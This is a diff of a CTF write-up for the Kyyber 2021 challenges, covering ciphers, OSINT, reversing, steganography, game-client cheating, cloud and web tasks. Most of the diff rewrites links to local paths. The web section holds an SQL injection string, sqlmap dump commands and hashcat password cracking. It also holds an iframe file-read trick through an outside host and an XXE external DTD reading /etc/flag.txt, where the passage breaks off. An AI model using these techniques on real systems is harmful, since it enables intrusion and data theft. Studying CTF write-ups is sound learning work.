@@ -47,7 +47,8 @@
 
 # 1. Good to know
 #### 1.1 Get Connected
-Here we get a link to [discord server](https://discord.gg/EJewUH95Hg) and we need to find the flag. If I were to start the CTF on the release day this would've been easier since it was the first actual post in the general channel which had the flag but since I didn't I used the all-so-handy search bar to look for "flag"
+Here we get a link to [discord server](https://discord.gg/EJewUH95Hg) and we need to find the flag.
+If I were to start the CTF on the release day this would've been easier since it was the first actual post in the general channel which had the flag but since I didn't I used the all-so-handy search bar to look for "flag"
 #### 1.2 Rules
 Rules flag is located inside the rules. Once you've read them you see the flag.
 # 2. First steps
@@ -55,7 +56,7 @@ Rules flag is located inside the rules. Once you've read them you see the flag.
     This is the flag, but its encrypted. Well, nothing can be done about it...
     RkxBR3tMb29rc19yZWFsbHlfY3J5cHRpY19idXRfaXNfZWFzaWx5X3JldmVyc2VkfQ==
 Our first challenge is to decrypt that string. We see the string is base64 encoded so we use basic linux terminal and decode it.
-```$ echo RkxBR3tMb29rc19yZWFsbHlfY3J5cHRpY19idXRfaXNfZWFzaWx5X3JldmVyc2VkfQ== | base64 -d```
+`echo RkxBR3tMb29rc19yZWFsbHlfY3J5cHRpY19idXRfaXNfZWFzaWx5X3JldmVyc2VkfQ== | base64 -d`
 
 #### 2.2 Basic Ciphers
 ```
@@ -69,7 +70,7 @@ Lets pop that terminal open again and use this little script that rotates the al
  $ echo SYNT{jryy_guvf_jnf_rnfl} | tr '[a-m][n-z][A-M][N-Z]' '[n-z][a-m][N-Z][A-M]'
 ```
 #### 2.3 I want to see more, see more and see more
-Here we are given a ![code.png](./basic-ciphers/code.png) picture which contains QR code. I chose to use [this](https://zxing.org/w/decode.jspx) website to decode the QR code from the image.
+Here we are given a [code.png](./basic-ciphers/code.png) picture which contains QR code. I chose to use [this](https://zxing.org/w/decode.jspx) website to decode the QR code from the image.
 Now we got something that looks like binary
 ```
 1101 1011 10 001 000111 110010 0111 1 1 1001 110010 0111 000 000 1001 110010 0111 1 1 1001 110010 0111 1 1 1001 110010 0111 000 000 1001 110010 00 110 1011 0 11 1001 1011 1 110010 1011 10 0100 1 101 111 110010 000 01 110010 0 000 1001 110010 000 1101 110010 1 10 0101 1111 110010 000 0 1111 1 101
@@ -90,7 +91,7 @@ Now we need to change that Morse code into something we can read so we fireup [C
 ```
 Time to test your skills on finding out a location based on what's in the picture: On what street is the picture taken on?
 ```
-Here we have a [picture](https://challenge.fi/files/097d470b449545a83697f8b01d68f971/osint1.PNG?token=eyJ1c2VyX2lkIjo0NjAsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjM0fQ.YGIvDw.xziWXLyALeZoHxr_HXPM8bMonDc) from some busy street and we need to figure out what street the picture was taken. On a first glance you might see Getto Food & Drinks on the lower right corner of the picture so let's google [that](https://letmegooglethat.com/?q=getto+food+%26+drinks) and there we go, first link shows us its in Amsterdam and we have a street address Warmoesstraat 51. There's your flag
+Here we have a [picture](./OSINT/osint1.png) from some busy street and we need to figure out what street the picture was taken. On a first glance you might see Getto Food & Drinks on the lower right corner of the picture so let's google [that](https://letmegooglethat.com/?q=getto+food+%26+drinks) and there we go, first link shows us its in Amsterdam and we have a street address Warmoesstraat 51. There's your flag
 #### 3.2 OSINT: GEOINT 2
 ```
 Time to raise the challenge. On what street is the house from which the picture was taken from located?
@@ -200,7 +201,7 @@ Let's do the same again, download the picture and load it in the [online exiftoo
 ```
 Are you able to find something interesting inside this compilation?
 ```
-Let's download our [file](https://challenge.fi/files/b88b4b9f4d92e67579768497bfac5c5d/level1.out?token=eyJ1c2VyX2lkIjo1NDAsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE1fQ.YGJKKA.EMdRodSqK1Rf3esoeC3RxDnwNCw) and run `file level1.out` 
+Let's download our [file](./binary/level1.out) and run `file level1.out` 
 ```
 $ file level1.out
 level1.out: Mach-O 64-bit x86_64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>
@@ -237,7 +238,7 @@ FLAG{ROTWasHere2021}
 ```
 Ok, the first binary challenge was trivial. This may not be...
 ```
-Let's download our [file](https://challenge.fi/files/7e1f4f8fd6a4c10132402b3f91fd6a3a/level2.out?token=eyJ1c2VyX2lkIjo1NDAsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE2fQ.YGJPpg.pUQQXXTri3D8tMtMxsLJhnpMDS4) and run strings again
+Let's download our [file](./binary/level2.out) and run strings again
 ```
 $ strings -n 7 level2.out |less
 ....
@@ -266,9 +267,9 @@ Thy password: Kissa123
 Thou fool! Thy must learn thy lessons better! Bits have not been manipulated correctly now.
 ```
 Aha! seems like we need to do some reversing on this executable. Lets fire up [Cutter](https://cutter.re/) and load the file in with Analysis Enabled (level aaa) and Write enabled. Let's jump into `Graph(entry0)` to look at what we're dealing with.
-![analysis](./analysis.png)
+![analysis](./binary/analysis.png)
 As you can see from the above picture the `cmp rax, 0xb` instruction checks if the given password is 11 characters long. If it's not we take the fork to the right and we know what happens there. You can try this by giving any characters as long as there are 11. So the thing we need to focus on is that other fork and there we follow it until `jne 0x100000e10` this is the part we want to reverse so we do a right click on the instruction and go to Edit > Reverse jump and tadaa it changes to `je 0x100000e10`
-![reverse_the_jump](./reverse_jump.png)
+![reverse_the_jump](./binary/reverse_jump.png)
 Now lets run the executable again and enter the password from before.
 ```
 $ ld-mac level2.out
@@ -286,14 +287,14 @@ This picture seems interesting...
 Can you find a secret location in this picture?
 ```
 Let's download the picture and load it on my favorite [online exiftool](http://exif.regex.info/exif.cgi). And it gives us a thumbnail picture
-![london](./london.jpg)
+![london](./steganography/london.jpg)
 Looks rather familiar doesn't it? It's the world famous London Eye, but since we were asked what's the secret location we use London as the flag and it works!
 #### 5.2 What's in this picture? 2/2
 ```
 This picture is more than meets the eye...
 Can you extract information from this picture and find a famous landmark hidden in it?
 ```
-Let's download the picture again and load it on my favorite [online exiftool](http://exif.regex.info/exif.cgi). Thumbnail picture is from a HP Laptop, I bet that's not the famous landmark, lets dig deeper. Lets use strings to findout if there's some other pictures inside it.
+Let's download the picture [again](./steganography/c.jpg) and load it on my favorite [online exiftool](http://exif.regex.info/exif.cgi). Thumbnail picture is from a HP Laptop, I bet that's not the famous landmark, lets dig deeper. Lets use strings to findout if there's some other pictures inside it.
 ```
 $ strings -n 3 -t x c.jpg |grep "JFIF\|PNG"
       6 JFIF
@@ -385,7 +386,7 @@ png:= 1
 Foremost finished at Tue Mar 30 15:24:16 2021
 ```
 And there we go we have 2 pictures. `00000000.jpg` is the picture of Eiffel Tower and `00003663.png` is the famous landmark. Let's take a look at that new picture 
-![angel_of_the_north](00003663.png)
+![angel_of_the_north](./steganography/00003663.png)
 Looks like a statue with plane wings. Lets do a google search for exactly [that](https://letmegooglethat.com/?q=Statue+with+plane+wings) and there we go The Angel of the North is our famous landmark and our flag.
 # 6. Crypto
 #### 6.1 Catch the criminal 1
@@ -430,7 +431,7 @@ decrypted_data: PNG image data, 663 x 284, 8-bit/color RGBA, non-interlaced
 Lets rename the file into .png and open it up
 $ mv decrypted_data decrypted_data.png
 ```
-![decrypted_data](decrypted_data.png)
+![decrypted_data](./crypto/crypto1/decrypted_data.png)
 #### 6.2 Catch the criminal 2
 ```
 After we were able to crack the encryption scheme used by the cybercriminal organization in challenge Catch the criminal 1
@@ -554,8 +555,8 @@ $ strings -n 7 -t x encode
 ```
 Nothing whatsoever, hmmm.. Lets open it up in [Cutter](https://cutter.re/) again and enable analysis (aaa) and write mode.
 From the functions panel we want to double-click that "main" function and look at it in the Dissassembly view. Looking at this kinda reminds us about the previous challenge. So we scroll down and we stop at `lea rdx, xkey ; 0x4010` xkey looks like a string let's double-click it and we get here
-![xkey](xkey.png)
-Let's look at this address in hexdump ![hexdump](hexdump.png)
+![xkey](./crypto/crypto2/xkey.png)
+Let's look at this address in hexdump ![hexdump](./crypto/crypto2/hexdump.png)
 Now that look like something we might use. Starting from 0x00004010 we can see 16 bytes that are being used as the keys to encrypt the data. So lets try using those.
 ```
 $ ./decode plain_text.encrypted plain_text.decrypted
@@ -596,7 +597,7 @@ $ mv decrypted_data decrypted_data.png
 ```
 
 And there we go we got the flag!
-![crypto2](crypto2.png)
+![crypto2](./crypto/crypto2/crypto2.png)
 
 P.S this can also be done with [CyberChef](https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Hex','string':'55aa332211449988eeff66cc2277aa55'%7D,'Standard',false)XOR(%7B'option':'Hex','string':'55'%7D,'Standard',false)XOR(%7B'option':'Hex','string':'aa'%7D,'Standard',false)) the link provides 3 xor rounds first one with the entire 16byte key `55aa332211449988eeff66cc2277aa55` and 2 others 2nd with key `55` and 3rd with key `aa`, just input the encrypted_data and download the file and name it download.png
 # 7. Cheating
@@ -632,7 +633,7 @@ Type "python3 server.py" to start the server
 Open another Command Prompt and launch the client
 If you are not able to run the unmodified clients or servers, you can ask help from discord. Obviously don't share information about the challenge itself!
 ```
-Alrighty lets download the zip [file](https://challenge.fi/files/99da8fe9fe5b742f461157c130111a5f/release_v1.0.zip?token=eyJ1c2VyX2lkIjo1NDAsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI1fQ.YGNmKw.cpMeCARelQxavQFV6hvfv_WYtQM) and extract it.
+Alrighty lets download the zip [file](./cheating/release_v1.0.zip) and extract it.
 ```
 wget https://challenge.fi/files/99da8fe9fe5b742f461157c130111a5f/release_v1.0.zip?token=eyJ1c2VyX2lkIjo1NDAsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI1fQ.YGNmKw.cpMeCARelQxavQFV6hvfv_WYtQM -O release_v1.0.zip
 unzip release_v1.0.zip
@@ -661,7 +662,7 @@ Lets check the first hint:
  1. Achievement for part 1 is called "PEW PEW!"
 
 Okay that tells us something, lets fire up the game. Start by running `python3 server.py` followed by `python3 client.py`
-![first_start](first_start.png)
+![first_start](./cheating/first_start.png)
 We can see our Ammo, Reload and HP in there. Hint said the first achievement is called "PEW PEW" so it must be something to do with the Ammo. Lets try shooting. We spend our 4 ammo and we begin to reload. So I think we must figure out how to shoot more than 4 times. Lets take a look at the `client.py` file. We scroll down to the bottom of the file and find our "shoot" function on lines 129-138
 ```
                     if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
@@ -688,7 +689,7 @@ Looking at the if clause `if me.ammo > 0:` if me(player).ammo is more than 0 sen
                         )
 ```
 Now the client doesn't do a check if we have more than 0 ammo and should let us shoot infinitely. Save the file and lets try it out. Launch the client again `python3 client.py` and start shooting. Yes it works! but we didn't get achievement because we're not in the correct server, lets change that. Lets comment `line 113` and uncomment the `line 114` now we can connect to the CTF hosted challenge server. Fire up the client again and go shooting.
-![pewpew](pewpew.png)
+![pewpew](./cheating/pewpew.png)
 #### 7.2 Project Kyyber 2021 part 2
 ```
 Project Kyyber 2021 has multiple flags!
@@ -730,14 +731,14 @@ Back in the `client.py` change we add a new sendevent in our jump function like 
                     sendevent.append(["reload"])
 ```
 That should do it, lets try it!
-![noroof](noroof.png)
+![noroof](./cheating/noroof.png)
 SUCCESS!
 #### 7.3 Project Kyyber 2021 part 3
 Hint:
  1. Achievement for part 3 is called "BOSSKILLER!"
 
 Alrighty then time to get those bigboy pants and see what we're up against. Lets try jumping all the way to the end of the world and see if we can find the boss.
-![bossfound](bossfound.png)
+![bossfound](./cheating/bossfound.png)
 Boss was found and when we landed we got killed pretty much instantly. Hmmmm, how do we proceed from this?
 Well first off we might want to shoot automatically so we dont need to click all the time. Lets do that first.
 
@@ -832,7 +833,7 @@ Line 131:                    sendevent.append(["left"])
 ```
 Now they will follow us around and shoot continuously. You can adjust where they shoot with your mouse once you start the botclient. To start the botclient you use `python3 botclient.py 18350961928273032797` for example. The master_id will be printed in our `client.py` start console.
 Now lets create some botclients and go kill that boss! Aaaaand its done!
-![bosskiller](bosskiller.png)
+![bosskiller](./cheating/bosskiller.png)
 # 8. Cloud
 #### 8.1 AWS Challenge 1
 ```
@@ -840,7 +841,7 @@ I built a Docker image just for you. Can you check if it has any security issues
 The image can be found from DockerHub: https://hub.docker.com/r/challengeapp/myapp
 ```
 Our hint is:
-![bucket](bucket.png)
+![bucket](./cloud/bucket.png)
 Looks like we need to install docker on our kali linux so lets do exactly that here's the [link](https://linuxhint.com/install_docker_kali_linux/) for installing Docker on Kali linux. Once that is done lets dive into the challenge.
 First lets pull our docker image with `docker pull challengeapp/myapp`
 ```
@@ -951,7 +952,7 @@ bash-5.0$ cat base.html
 </body>
 ```
 Still remember our hint for the challenge? Thats a S3 Bucket address. Lets take a look at it.
-![s3bucket_response](s3bucket.png)
+![s3bucket_response](./cloud/s3bucket.png)
 Looks like we found ourselves a flag!
 ```
 $ curl https://frk-bucket-challenge-1234.s3.amazonaws.com/settings/stuff/flag.txt
@@ -1331,7 +1332,7 @@ What can we learn by examining this certificate?
 
 Don't import this to your computer as a trusted root certificate!
 ```
-Lets download the [cert](https://challenge.fi/files/2a778a1335d99adc9465016bab55f5d8/server.crt?token=eyJ1c2VyX2lkIjo1NDAsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE0fQ.YGT3ug.tGqaoWHyevoDOgIgB0gANYmnRZw) and examine it using OpenSSL. Lets run `openssl x509 -in server.crt -text -noout`. We use `-text` to get the information about the certificate in our console and `-noout` to disable the certificate from being print to our console (optional)
+Lets download the [cert](./web/server.crt) and examine it using OpenSSL. Lets run `openssl x509 -in server.crt -text -noout`. We use `-text` to get the information about the certificate in our console and `-noout` to disable the certificate from being print to our console (optional)
 ```
 openssl x509 -in server.crt -text -noout
 Certificate:
@@ -1395,19 +1396,19 @@ Do you accept the challenge?
 http://hacklogin.challenge.fi/
 ```
 We got ourselves a website, lets take a look.
-![hacklogin_index](hacklogin_index.png)
+![hacklogin_index](./web/hacklogin_index.png)
 So its a webform, lets try some basic default passwords (12345, admin, admin123, P4ssw0rd etc.) with user `admin`. Nothing seems to be working. What about the Forgot your password? link. Lets see where that leads us. It takes us to https://hacklogin.challenge.fi/password-recovery.php and it only requires username. Lets try with the user admin.
-![recovery_mail](recovery_mail.png)
+![recovery_mail](./web/recovery_mail.png)
 Well that didn't help much... I've read about SQL Injection being used in login forms, maybe we can use this?
 Lets try to input `' or '' = '` into username and password on the login page.
-![usernotfound](usernotfound.png)
+![usernotfound](./web/usernotfound.png)
 Guess it doesn't work here. What if we try it on the password recovery page?
-![allusersexposed](allusersexposed.png)
+![allusersexposed](./web/allusersexposed.png)
 Seems like it works! Lets use our trusted program from SQL Injections called [sqlmap](http://sqlmap.org/).
 Lets run this `sqlmap -u https://hacklogin.challenge.fi/password-recovery.php --data "username=admin" --threads 10 --batch -dbs`
-![dbfound](dbfound.png)
+![dbfound](./web/dbfound.png)
 Next lets add the database into our line and lets dump all data that the database has. `sqlmap -u https://hacklogin.challenge.fi/password-recovery.php --data "username=admin" --threads 10 --batch -D random --dump-all`
-![dumpall](dumpall.png)
+![dumpall](./web/dumpall.png)
 We got the hash and it works as a flag!
 #### 9.3 Hack weblogin part 2
 We can use [hashcat](https://hashcat.net/hashcat/) for this lets run `hashcat -a 0 -m 10 adminhash rockyou.txt`
@@ -1426,7 +1427,7 @@ Dictionary cache built:
 69ba2cec4f84667e875e9db710b3c9ad:bfds3:chess
 ```
 Now we can login with admin:chess
-![isnice](isnice.png)
+![isnice](./web/isnice.png)
 IZ NICE!
 #### 9.4 Hack MD
 ```
@@ -1454,12 +1455,12 @@ First we press `New` in the hack-md page to create a fresh note. Then we use the
  1. Type `<iframe src="https://exec.ga/hackmd.html" sandbox="allow-scripts allow-top-navigation allow-scripts"></iframe>` in Editor.
  2. View edited page.
 Lets edit that site to something we can use like https://hack-md.challenge.fi
-![iframeredirect](iframeredirect.png)
+![iframeredirect](./web/iframeredirect.png)
 Seems to be working. No we can try to extract the file from the server using `file://` in the `src=` section.
-![noflag](noflag.png)
+![noflag](./web/noflag.png)
 Hmmm doesn't seem to be working right off the bat. Should we try exporting to PDF? could that be the trick. Lets try it.
 We write `/pdf` in our [url](https://hack-md.challenge.fi/Ty_qf4mCRImlxSOzzY2FTg/pdf) and download the PDF file.
-![flagfound](flagfound.png)
+![flagfound](./web/flagfound.png)
 
 #### 9.5 Aapoweb
 ```
@@ -1478,14 +1479,14 @@ Hints:
  6. Maybe the better question is. Does it matter who has issued the certificate? https://en.wikipedia.org/wiki/OpenSSL
 ```
 Lets focus on the task at hand. Load up the [website](https://aapoweb.challenge.fi:8008/) and we'll see what we're dealing with. After loading the site we get a security warning saying the connection is not safe.
-![selfsignedcert](selfsignedcert.png) we press Accept the risk and Continue and we get here:
-![notaapo](notaapo.png)
+![selfsignedcert](./web/selfsignedcert.png) we press Accept the risk and Continue and we get here:
+![notaapo](./web/notaapo.png)
 Uhhuh, so we need to identify ourselves to the website as Aapo just like it said in the challenge description. But how can we do that? Let's examine the certificate. 
-![secinfo](secinfo.png)
+![secinfo](./web/secinfo.png)
 Lets view the certificate
-![subjectissuer](subjectissuer.png)
+![subjectissuer](./web/subjectissuer.png)
 We scroll down a bit more and we find out we're able to download the certificate and the certificate chain files
-![certdownload](certdownload.png)
+![certdownload](./web/certdownload.png)
 Lets do exactly that and then lets try something with OpenSSL. Lets use `openssl s_client -connect aapoweb.challenge.fi:8008 -cert aapoweb.pem`
 ```
 $ openssl s_client -connect aapoweb.challenge.fi:8008 -cert aapoweb.pem
@@ -1622,11 +1623,11 @@ Note: This challenge is based on a real world example of a finding from a bug bo
 ```
 This one was actually very difficult, no hits whatsoever. No indication where to begin except the website. Took me over 2 days to figure this one out, but I'll try to keep it short.
 First I started by going to the website annd we get greeted with this:
-![spongebob](spongebob.png)
+![spongebob]./web/(spongebob.png)
 So I figure i'd check the source using `view-source:` and we got this!
-![debug](debug.png)
+![debug](./web/debug.png)
 Alright! We got something, looks like the site has xml.php with xml parameter. The string looks like its URL Encoded and Base64 encoded so lets use [CyberChef](https://gchq.github.io/CyberChef/) to decode it. We got this:
-![decoded](decoded.png)
+![decoded](./web/decoded.png)
 Alright so we're dealing with actual XML and I figured we're most likely going to do some sort of XXE attack (XML External Entity) here. So I start googling about XXE attacks and I tried a few (read: A LOT) different ways but I never seemed to get any other response from the server than `Username or password not found! Try Harder!`. Then after a while of banging my head against the table I stumbled upon [THIS](https://medium.com/@jonathanbouman/xxe-at-bol-com-7d331186de54) a brilliant bugbounty write up by Jonathan Bouman. He was using [xxeserv](https://github.com/staaldraad/xxeserv) along with external DTD file on a public facing server. So that's exactly what I did. I installed xxeserv and copied his sp2.dtd
 ```
 <!ENTITY % d SYSTEM "file:///etc/flag.txt">
